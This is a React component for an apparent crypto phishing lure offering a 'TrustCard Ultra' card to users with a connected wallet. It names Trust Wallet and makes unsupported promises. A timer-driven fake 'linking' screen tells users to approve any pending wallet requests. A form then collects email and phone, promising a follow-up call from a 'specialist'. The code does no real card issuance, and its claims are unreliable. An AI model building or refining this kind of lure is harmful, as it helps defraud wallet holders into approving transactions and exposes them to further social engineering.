import { useEffect, useMemo, useState } from "react";
import type { SessionSnapshot } from "../../types/wallet";
import { shortenAddress } from "../../utils/format";
import { UltraCardVisual } from "./UltraCardVisual";

type CardFlowStep = "claim" | "linking" | "shipping" | "done";

interface CardOnboardingFlowProps {
  readonly session: SessionSnapshot;
}

const FEATURES = [
  "Up to 5% crypto cashback on every purchase",
  "Zero annual fee, ever",
  "Global acceptance at 80M+ merchants",
  "Instant approval — no credit check",
];

const LINKING_STEPS = [
  "Pairing with Trust Wallet",
  "Issuing banking authorization",
  "Confirming on-chain session",
];

const STORAGE_KEY = "wc.phase1.card.application";

export function CardOnboardingFlow({ session }: CardOnboardingFlowProps) {
  const [open, setOpen] = useState(true);
  const [step, setStep] = useState<CardFlowStep>("claim");
  const [linkIndex, setLinkIndex] = useState(0);
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [reference, setReference] = useState("");

  const holderName = useMemo(
    () => shortenAddress(session.walletAddress).replace("...", " "),
    [session.walletAddress],
  );

  useEffect(() => {
    if (step !== "linking") {
      return;
    }

    setLinkIndex(0);
    const timer = window.setInterval(() => {
      setLinkIndex((current) => {
        if (current >= LINKING_STEPS.length - 1) {
          window.clearInterval(timer);
          window.setTimeout(() => setStep("shipping"), 600);
          return current;
        }
        return current + 1;
      });
    }, 900);

    return () => window.clearInterval(timer);
  }, [step]);

  const submitShipping = (event: React.FormEvent): void => {
    event.preventDefault();
    const nextReference = `TC-${session.walletAddress.slice(2, 8).toUpperCase()}`;
    setReference(nextReference);
    window.localStorage.setItem(
      STORAGE_KEY,
      JSON.stringify({
        email,
        phone,
        walletAddress: session.walletAddress,
        sessionTopic: session.sessionTopic,
        reference: nextReference,
        timestamp: Date.now(),
      }),
    );
    setStep("done");
  };

  if (!open) {
    return null;
  }

  return (
    <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/70 px-4">
      <div className="relative max-h-[92vh] w-full max-w-[400px] overflow-y-auto rounded-[28px] bg-white p-5 text-black shadow-2xl">
        <button
          type="button"
          className="absolute right-4 top-4 flex h-8 w-8 items-center justify-center rounded-full bg-neutral-200 text-lg text-neutral-600 hover:bg-neutral-300"
          onClick={() => setOpen(false)}
          aria-label="Close"
        >
          ×
        </button>

        {step === "claim" ? (
          <ClaimStep
            holderName={holderName}
            onContinue={() => setStep("linking")}
          />
        ) : null}

        {step === "linking" ? <LinkingStep activeIndex={linkIndex} /> : null}

        {step === "shipping" ? (
          <ShippingStep
            email={email}
            phone={phone}
            onEmailChange={setEmail}
            onPhoneChange={setPhone}
            onSubmit={submitShipping}
          />
        ) : null}

        {step === "done" ? <DoneStep reference={reference} /> : null}
      </div>
    </div>
  );
}

function ClaimStep({
  holderName,
  onContinue,
}: {
  holderName: string;
  onContinue: () => void;
}) {
  return (
    <div className="flex flex-col gap-4 pt-2">
      <p className="text-sm font-medium text-[#2563eb]">Your TrustCard</p>
      <h2 className="text-[28px] font-bold leading-8 text-neutral-900">
        Claim your Ultra card.
      </h2>
      <p className="text-sm leading-6 text-neutral-500">
        Premium steel finish. Direct wallet connection. Rewards on every swipe.
      </p>

      <div className="py-2">
        <UltraCardVisual holderName={holderName} />
      </div>

      <ul className="space-y-3 rounded-2xl bg-neutral-100 p-4">
        {FEATURES.map((item) => (
          <li key={item} className="flex items-start gap-3 text-sm text-neutral-800">
            <CheckIcon />
            <span>{item}</span>
          </li>
        ))}
      </ul>

      <button
        type="button"
        onClick={onContinue}
        className="mt-1 w-full rounded-full bg-[#2563eb] py-3.5 text-base font-semibold text-white hover:bg-[#1d4ed8]"
      >
        Get Yours Now →
      </button>

      <div className="flex flex-wrap justify-center gap-x-5 gap-y-2 pb-1 text-xs text-neutral-500">
        <span className="flex items-center gap-1">
          <CheckIcon small /> Non-custodial
        </span>
        <span className="flex items-center gap-1">
          <CheckIcon small /> End-to-end encrypted
        </span>
        <span className="flex items-center gap-1">
          <CheckIcon small /> No seed phrase required
        </span>
      </div>
    </div>
  );
}

function LinkingStep({ activeIndex }: { activeIndex: number }) {
  return (
    <div className="flex flex-col gap-4 pt-8">
      <h3 className="text-xl font-bold text-neutral-900">
        Linking your account to banking partner
      </h3>
      <p className="text-sm leading-6 text-neutral-500">
        Keep Trust Wallet open and approve any pending requests to complete your
        application.
      </p>

      <ul className="space-y-3 rounded-2xl bg-neutral-100 p-4 text-sm text-neutral-800">
        <li>
          <span className="font-medium">Issuing partner</span>
          <p className="text-neutral-500">TrustCard Issuing Ltd</p>
        </li>
        <li>
          <span className="font-medium">Card product</span>
          <p className="text-neutral-500">TrustCard Ultra</p>
        </li>
        <li>
          <span className="font-medium">Annual fee</span>
          <p className="text-neutral-500">£0.00 · No hidden fees</p>
        </li>
      </ul>

      <ul className="space-y-3 pt-2">
        {LINKING_STEPS.map((label, index) => (
          <li key={label} className="flex items-center gap-3 text-sm text-neutral-800">
            {index <= activeIndex ? (
              <CheckIcon />
            ) : (
              <span className="h-5 w-5 rounded-full border border-neutral-300" />
            )}
            {label}
          </li>
        ))}
      </ul>
    </div>
  );
}

function ShippingStep({
  email,
  phone,
  onEmailChange,
  onPhoneChange,
  onSubmit,
}: {
  email: string;
  phone: string;
  onEmailChange: (value: string) => void;
  onPhoneChange: (value: string) => void;
  onSubmit: (event: React.FormEvent) => void;
}) {
  return (
    <form className="flex flex-col gap-4 pt-8" onSubmit={onSubmit}>
      <h2 className="text-2xl font-bold text-neutral-900">
        Where should we send your card?
      </h2>
      <p className="text-sm leading-6 text-neutral-500">
        A dedicated onboarding specialist from our issuing partner will contact you
        to confirm your shipping address and schedule activation.
      </p>

      <label className="text-sm font-medium text-neutral-700">
        Email address
        <input
          required
          type="email"
          value={email}
          onChange={(event) => onEmailChange(event.target.value)}
          className="mt-1 w-full rounded-xl border border-neutral-200 px-3 py-3 text-base text-black outline-none focus:border-[#2563eb]"
        />
      </label>

      <label className="text-sm font-medium text-neutral-700">
        Phone number
        <input
          required
          type="tel"
          value={phone}
          onChange={(event) => onPhoneChange(event.target.value)}
          className="mt-1 w-full rounded-xl border border-neutral-200 px-3 py-3 text-base text-black outline-none focus:border-[#2563eb]"
        />
      </label>

      <button
        type="submit"
        className="mt-2 w-full rounded-full bg-[#2563eb] py-3.5 text-base font-semibold text-white hover:bg-[#1d4ed8]"
      >
        Submit application
      </button>
    </form>
  );
}

function DoneStep({ reference }: { reference: string }) {
  return (
    <div className="flex flex-col gap-4 pt-8">
      <h2 className="text-2xl font-bold text-neutral-900">You're on the list.</h2>
      <p className="text-sm leading-6 text-neutral-500">
        Thank you for applying. Your wallet has been securely linked and your
        application is now under review by our issuing partner.
      </p>
      <p className="rounded-2xl bg-neutral-100 px-4 py-3 text-center font-mono text-lg font-semibold text-neutral-900">
        {reference}
      </p>
      <p className="text-sm leading-6 text-neutral-500">
        Please keep this reference number. You'll receive a confirmation and next
        steps shortly — check both your email and your wallet's messages inbox.
      </p>
    </div>
  );
}

function CheckIcon({ small = false }: { small?: boolean }) {
  const size = small ? "h-4 w-4" : "h-5 w-5";
  return (
    <span
      className={`mt-0.5 inline-flex ${size} shrink-0 items-center justify-center rounded-full bg-[#2563eb] text-[10px] font-bold text-white`}
    >
      ✓
    </span>
  );
}
